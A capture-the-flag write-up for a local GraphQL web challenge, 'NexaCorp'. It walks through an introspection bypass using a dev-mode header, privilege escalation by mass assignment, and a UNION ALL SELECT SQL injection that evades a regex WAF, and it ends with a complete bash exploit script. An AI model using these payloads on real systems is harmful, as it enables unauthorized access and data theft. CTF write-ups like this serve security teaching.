# NexaCorp — Writeup

**Category:** Web
**Flag:** `Pioneers25{gr4phql_1ntr0sp3ct10n_byp4ss_m4ss_4ss1gnm3nt_4nd_un10n_sql_1nj3ct10n_ch41n3d}`

---

## Challenge Overview

**NexaCorp** is a corporate portal built with GraphQL, featuring authentication, user profiles, and an admin-only employee search. The challenge chains **four vulnerabilities** to achieve full exploitation:

1. **GraphQL Endpoint Discovery**
2. **Introspection Bypass** (Dev Mode Header)
3. **Mass Assignment Vulnerability** → Privilege Escalation
4. **SQL Injection with WAF Bypass** → Flag Extraction

---

## Deployment

### Docker (Recommended)

```bash
docker-compose up --build
```

The challenge will be available at `http://localhost:3000`.

---

## Stage 1: Endpoint Discovery

### Initial Reconnaissance

Visiting `http://localhost:3000/` shows a corporate login page with minimal functionality. View the page source:

```html
<!-- TODO @devops: remove X-Dev-Mode bypass before final production deployment -->
```

This hints at a `X-Dev-Mode` header for later use.

### Finding the GraphQL Endpoint

**Option 1: Intercept traffic**

Open browser DevTools → Network tab → Try to login or register. Observe:

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"mutation L($u:String!,$p:String!){login(username:$u,password:$p){token user{id username role}}}","variables":{"u":"test","p":"test"}}
```

**Option 2: Decode base64 in source**

The inline JavaScript contains `atob("L2dyYXBocWw=")` which decodes to `/graphql`.

**Endpoint confirmed:** `/graphql`

---

## Stage 2: Schema Enumeration (Introspection Bypass)

### Blocked Introspection

Attempting standard introspection:

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

**Response:**
```json
{"errors":[{"message":"GraphQL introspection is not allowed, except in development mode."}]}
```

### Bypass with X-Dev-Mode Header

Use the header from the HTML comment:

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -H "X-Dev-Mode: 1" \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } types { name fields { name type { name } } } } }"}'
```

**Success!** Full schema returned.

### Key Schema Findings

| Discovery | Significance |
|-----------|-------------|
| `UpdateProfileInput.role` | Editable role field → Mass assignment vector |
| `searchEmployees(query: String!)` | Admin-only query → Likely SQL injection target |
| `updateProfile` returns `token` | Re-issues JWT after update |
| `adminPanel` query | Admin-only dashboard |

---

## Stage 3: Privilege Escalation (Mass Assignment)

### Register Normal Account

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username: \"hacker\", password: \"hacker123\") { token user { id username role } } }"}'
```

**Response:**
```json
{
  "data": {
    "register": {
      "token": "eyJhbGc...",
      "user": {"id": "2", "username": "hacker", "role": "employee"}
    }
  }
}
```

Save the token: `TOKEN=eyJhbGc...`

### Escalate to Admin via Mass Assignment

The `updateProfile` mutation accepts a `role` field that shouldn't be user-editable:

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateProfile(input: { role: \"admin\" }) { token user { role } } }"}'
```

**Response:**
```json
{
  "data": {
    "updateProfile": {
      "token": "eyJhbGc...(new)",
      "user": {"role": "admin"}
    }
  }
}
```

Save new token: `ADMIN_TOKEN=eyJhbGc...(new)`

Admin privileges achieved! ✅

---

## Stage 4: SQL Injection (WAF Bypass)

### Verify Admin Access

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"query":"{ searchEmployees(query: \"Alice\") { id name department } }"}'
```

Returns Alice's employee data → Admin access confirmed.

### WAF Analysis

Testing various SQL injection payloads reveals the WAF blocks:

| Input | Error Message |
|-------|--------------|
| `UNION SELECT` | `WAF: UNION SELECT pattern is not allowed.` |
| `--` | `WAF: SQL single-line comments (--) are not allowed.` |
| `/*` | `WAF: SQL block comments (/*) are not allowed.` |
| `;` | `WAF: semicolons are not allowed.` |

### The Bypass: UNION ALL SELECT

**Key insight:** `UNION ALL SELECT` has the word `ALL` between `UNION` and `SELECT`, breaking the WAF's `\s+` regex pattern!

Additionally, we don't need comments. The query template is:

```sql
WHERE name LIKE '%{input}%'
```

We can close the trailing `%'` by ending with `WHERE 'a' LIKE '` — the template appends `%'` making it `LIKE '%'` (always true).

### Find Column Count

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,2,3,4 WHERE 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

**Success!** 4 columns confirmed. Column 2 maps to `name` in the response.

### Enumerate Tables

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,name,type,0 FROM sqlite_master WHERE type='table' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

Tables found: `users`, `employees`, `secrets`

### Read Secrets Schema

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,sql,'x',0 FROM sqlite_master WHERE name='secrets' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

Schema: `CREATE TABLE secrets (id ..., key TEXT, value TEXT)`

### Extract Flag

```bash
curl -X POST http://localhost:3000/graphql \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT id,value,'x',0 FROM secrets WHERE key='flag' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')" | jq .
```

**Response:**
```json
{
  "data": {
    "searchEmployees": [
      {
        "name": "Pioneers25{gr4phql_1ntr0sp3ct10n_byp4ss_m4ss_4ss1gnm3nt_4nd_un10n_sql_1nj3ct10n_ch41n3d}"
      }
    ]
  }
}
```

🎉 **Flag captured!**

---

## Complete Exploitation Summary

| Stage | Vulnerability | Bypass Technique |
|-------|--------------|------------------|
| 1 | Hidden API | Traffic interception / base64 decode |
| 2 | Introspection disabled | `X-Dev-Mode: 1` header |
| 3 | Mass assignment | `updateProfile(input: { role: "admin" })` |
| 4 | SQL injection WAF | `UNION ALL SELECT` + `WHERE 'a' LIKE '` |

---

## Full Exploit Script

```bash
#!/bin/bash

BASE="http://localhost:3000/graphql"

# Stage 1: Register account
TOKEN=$(curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{register(username:\"hacker\",password:\"pass\"){token}}"}' \
  | jq -r '.data.register.token')

echo "[+] Registered: $TOKEN"

# Stage 2: Escalate to admin
ADMIN_TOKEN=$(curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation{updateProfile(input:{role:\"admin\"}){token}}"}' \
  | jq -r '.data.updateProfile.token')

echo "[+] Admin token: $ADMIN_TOKEN"

# Stage 3: Extract flag via SQL injection
FLAG=$(curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT id,value,'x',0 FROM secrets WHERE key='flag' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')" \
  | jq -r '.data.searchEmployees[0].name')

echo "[✓] FLAG: $FLAG"
```

---

## Key Takeaways

1. **Hidden endpoints require reconnaissance** — Always intercept traffic and inspect JavaScript
2. **Dev headers leak into production** — Never leave debug backdoors in deployed code
3. **GraphQL introspection reveals attack surface** — Schema exposure shows all available fields
4. **Mass assignment is critical in GraphQL** — Input types should validate field-level permissions
5. **Regex WAFs have gaps** — `UNION ALL SELECT` bypasses `UNION\s+SELECT` pattern
6. **SQL comment alternatives exist** — `WHERE 'a' LIKE '` closes queries without `--` or `;`
